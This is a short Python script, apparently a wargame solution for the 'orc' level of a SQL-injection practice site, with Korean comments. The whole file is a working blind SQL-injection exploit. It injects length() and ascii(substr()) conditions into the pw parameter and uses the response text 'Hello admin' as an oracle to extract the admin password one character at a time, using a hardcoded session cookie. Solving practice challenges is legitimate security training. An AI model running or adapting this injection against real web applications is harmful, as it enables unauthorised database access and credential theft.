import requests

host = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {'PHPSESSID': '6bo552sbv1icedtlc6l5bo4ldv'}
pw_length = 0

while True:
    pw_length += 1

    query = f"' or id='admin' and length(pw)={pw_length}-- -"
    url = f"{host}?pw={query}"
    r = requests.get(url, cookies=cookies)
    
    if "Hello admin" in r.text:
        break

print(f"비밀번호 길이 : {pw_length}")

password = ""

for i in range(1, pw_length+1):
    for j in range(32, 127): # 공백(32)부터 ~까지(126) 아스키 코드 대조
        query = f"' or id='admin' and ascii(substr(pw,{i},1))={j}-- -"
        url = f"{host}?pw={query}"
        r = requests.get(url, cookies=cookies)
        
        if "Hello admin" in r.text:
            password += chr(j)
            print(f"{i}번째까지 찾음 : {password}")
            break

print(f"password: {password}")